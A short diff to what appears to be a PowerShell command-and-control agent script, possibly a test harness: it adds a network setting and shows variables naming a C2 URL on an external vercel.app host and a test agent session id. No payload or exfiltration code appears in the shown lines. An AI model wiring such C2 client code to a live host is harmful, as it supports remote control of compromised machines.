@@ -1,4 +1,5 @@
 $ErrorActionPreference = 'Stop'
+[System.Net.ServicePointManager]::Expect100Continue = $false
 $C2Url = "https://bom-kaos-kaki.vercel.app"
 $TestSessionId = "TEST-AGENT-" + (Get-Random -Minimum 1000 -Maximum 9999)
 
